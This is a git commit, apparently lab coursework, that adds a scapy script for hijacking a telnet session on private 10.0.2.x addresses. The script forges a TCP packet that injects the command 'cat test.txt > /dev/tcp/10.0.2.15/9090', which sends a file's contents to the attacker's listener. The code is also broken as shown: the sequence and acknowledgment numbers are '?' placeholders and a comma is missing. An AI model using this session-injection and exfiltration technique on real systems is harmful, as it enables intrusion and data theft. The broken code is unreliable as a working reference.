27e672f19d00cea2e2d512aa99239e8852006721
Ethan Link <ethanlink255@gmail.com>
2022-03-23 14:32:03 -0400

    Initial hijacking

---
+++ Hijacking/reverse.py
@@ -0,0 +1,9 @@
+import sys
+from scapy.all import *
+
+IPLayer = IP(src="10.0.2.15" dst="10.0.2.4")
+TCPLayer = TCP(sport=51386, dport=23, flags="A", seq=?, ack=?)
+Data = "\r cat test.txt > /dev/tcp/10.0.2.15/9090\r"
+pkt = IPLayer/TCPLayer/Data
+ls(pkt)
+send(pkt, verbose=0)
